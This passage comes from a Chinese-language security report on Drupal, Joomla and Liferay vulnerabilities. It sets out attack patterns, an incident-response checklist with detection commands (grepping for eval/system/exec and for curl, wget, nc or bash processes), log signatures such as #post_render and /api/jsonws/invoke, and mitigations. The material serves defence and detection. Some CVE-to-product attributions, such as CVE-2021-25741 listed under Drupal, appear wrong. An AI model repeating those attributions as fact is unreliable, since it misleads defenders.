1. **版本指纹识别**：通过 HTTP 响应头、CHANGELOG.txt、robots.txt 等识别目标 CMS 类型和版本
2. **非侵入式检测**：仅发送检测性请求（如 Nuclei 模板），不执行实际的命令注入
3. **日志关联分析**：在 WAF/IDS 日志中搜索已知的攻击特征（如 `#post_render`、`#type=markup`、`/api/jsonws/invoke`）
4. **漏洞扫描器联动**：使用 Nessus、OpenVAS、Qualys 等企业级扫描器进行批量检测

---

## 0x05 共性攻击模式分析

### 模式 1：PHP/Java 反序列化攻击链

**代表漏洞**：CVE-2018-7600/7602（Drupal）、CVE-2021-23132（Joomla）、CVE-2020-7961/CVE-2023-37694（Liferay）

反序列化攻击是开源 CMS 和 Java 企业应用中最普遍的高危攻击模式。PHP 生态中利用 `unserialize()` 函数处理不可信数据，Java 生态中利用 `ObjectInputStream` 反序列化用户输入。两者的共同特点是：

- **攻击复杂度低**：已有成熟的利用框架（PHPGGC、ysoserial）
- **危害程度高**：一旦 Gadget Chain 成功，可直接执行任意系统命令
- **修复难度大**：需要从根本上改变数据处理方式或引入反序列化白名单

### 模式 2：Web API 认证/授权绕过

**代表漏洞**：CVE-2023-23752（Joomla）、CVE-2019-16898（Liferay）

RESTful API 的认证绕过是现代 Web 应用最常见的安全缺陷之一。根本原因在于：

1. API 端点的路由注册与认证中间件的绑定存在遗漏
2. 在 API 版本迭代过程中新增端点时遗漏了认证配置
3. 认证拦截器的逻辑缺陷（如仅检查特定头部而忽略其他认证方式）

### 模式 3：模板注入（FreeMarker/Velocity/Smarty）

**代表漏洞**：CVE-2020-13450（Liferay FreeMarker SSTI）

模板注入攻击的核心在于将用户可控的输入直接嵌入模板表达式中，导致攻击者可以在模板引擎的上下文中执行任意逻辑。FreeMarker 的 `?new()` 和 `Execute` 类是 Java SSTI 的经典利用向量。防御关键是：对模板输入进行沙箱隔离、禁用危险的内建函数和类解析器。

### 模式 4：SQL 注入到 RCE 升级路径

**代表漏洞**：CVE-2020-11890/11891（Joomla）

SQL 注入在开源 CMS 中通常不是终点，而是升级路径的起点。典型攻击链：SQL 注入 → 读取配置文件（获取 DB 凭据和 Web 路径）→ `INTO OUTFILE` 写入 Webshell → RCE。在 MySQL `secure_file_priv` 未配置的情况下，攻击者可以实现从 SQL 注入到完全服务器控制的升级。

### 模式 5：文件上传与路径穿越

**代表漏洞**：CVE-2021-25741（Drupal）、CVE-2019-12600（Joomla）

文件操作类漏洞包括不安全的文件上传和路径穿越两种子类型。前者通过绕过文件类型检查上传可执行脚本，后者通过 `../` 序列将文件写入 Web 目录之外。两者的最终目标都是在服务器上写入 Webshell。防御措施包括：严格的文件扩展名白名单、存储路径不可预测化（使用随机文件名）、禁止在 Web 目录中执行上传文件的脚本引擎。

---

## 0x06 应急排查与防守建议

### 紧急排查清单

| 步骤 | 排查内容 | 命令/方法 |
|------|---------|----------|
| 1 | 识别 CMS 类型和版本 | 检查 `/CHANGELOG.txt`、HTTP 响应头、`robots.txt` |
| 2 | 检查是否应用安全更新 | Drupal: `drush status`；Joomla: 后台 → 系统信息；Liferay: 检查 build 号 |
| 3 | 检查 Webshell | `find /var/www -name "*.php" -newer /var/www/index.php -exec grep -l "eval\|system\|exec" {} \;` |
| 4 | 检查异常进程 | `ps auxf | grep -E "curl|wget|nc|bash"` |
| 5 | 检查异常网络连接 | `netstat -antp | grep -E "ESTABLISHED\|SYN_SENT"` |
| 6 | 检查异常计划任务 | `crontab -l && ls -la /etc/cron*` |
| 7 | 检查异常用户 | `grep -v "nologin\|false" /etc/passwd` |
| 8 | 检查 Web 访问日志中的攻击特征 | 搜索 `#post_render`、`#type=markup`、`/api/jsonws/invoke` |

### 日志关键字段表

| 日志源 | 关键字段 | 搜索关键词 |
|--------|---------|-----------|
| Nginx Access Log | request_uri, request_body | `#post_render`, `#type=markup`, `element_parents`, `ajax_form=1` |
| Apache Access Log | request, query_string | `user/register?element_parents`, `/api/jsonws/invoke`, `com_fields` |
| Drupal Watchdog Log | message, type | `error`, `warning`, `php` |
| Joomla Administrator Log | message | `login`, `user`, `api` |
| Liferay Server Log | INFO/SEVERE | `jsonws`, `deserialize`, `ClassCastException` |
| WAF 日志 | matched_rule | `SQL Injection`, `Deserialization`, `Path Traversal` |

### 紧急缓解措施

1. **立即应用安全补丁**：根据受影响版本表格，升级到修复版本
2. **启用 WAF 规则**：部署针对 Drupal Form API 注入、Liferay `/api/jsonws/invoke` 访问、Joomla SQL 注入的 WAF 规则
3. **限制 API 端点访问**：在 WAF 或反向代理层限制 `/api/jsonws`、`/api/v1/users` 等端点的访问来源
4. **禁用不必要的功能**：关闭注册功能（如果不需要）、限制 `com_media` 的文件上传类型
5. **网络隔离**：将 CMS 服务器部署在 DMZ 中，限制其对内部数据库和其他服务的直接访问
6. **启用审计日志**：开启所有 CMS 的详细日志记录功能

### 长期安全加固建议

1. **建立补丁管理流程**：定期关注各 CMS 的安全公告，建立 72 小时内应用关键补丁的 SLA
2. **最小权限原则**：Web 服务以低权限用户运行（非 root），数据库使用最小权限账户
3. **多因素认证（MFA）**：为所有管理后台启用 MFA，防止弱口令和凭证泄露
4. **内容安全策略（CSP）**：实施严格的 CSP 头，减少 XSS 攻击的影响范围
5. **定期安全审计**：每季度进行一次 CMS 安全配置审计和渗透测试
6. **备份与恢复计划**：建立自动化备份机制和灾难恢复流程
7. **监控与告警**：部署 SIEM 系统，配置针对 CMS 攻击特征的实时告警

---

## 0x07 参考资料

1. **Drupal SA-CORE-2018-002** — Drupalgeddon 2 安全公告. https://www.drupal.org/SA-CORE-2018-002
2. **Drupal SA-CORE-2018-004** — Drupalgeddon 3 安全公告. https://www.drupal.org/SA-CORE-2018-004
3. **NVD CVE-2018-7600** — National Vulnerability Database. https://nvd.nist.gov/vuln/detail/CVE-2018-7600
4. **Joomla Security Centre** — CVE-2023-23752 安全公告. https://developer.joomla.org/security-centre/894-20230201-core-unauthorised-api-access.html
5. **Liferay Portal CVE-2020-7961 Advisory** — JSON 反序列化漏洞. https://portal.liferay.dev/2020/03/31/security-advisory-for-cve-2020-7961
6. **CISA Known Exploited Vulnerabilities Catalog** — 已知被利用漏洞目录. https://www.cisa.gov/known-exploited-vulnerabilities-catalog
7. **Vulhub** — 开源漏洞靶场环境. https://github.com/vulhub/vulhub
8. **ysoserial** — Java 反序列化利用工具. https://github.com/frohoff/ysoserial
9. **PHPGGC** — PHP 反序列化利用工具. https://github.com/ambionics/phpggc
10. **Nuclei Templates** — ProjectDiscovery 开源扫描模板. https://github.com/projectdiscovery/nuclei-templates
11. **Drupal SA-CORE-2020-007** — 渲染回调与 AJAX API 安全公告. https://www.drupal.org/SA-CORE-2020-007
12. **Joomla Security Centre** — CVE-2021-23132 反序列化漏洞. https://developer.joomla.org/security-centre/830-20210701-core-session-deserialization.html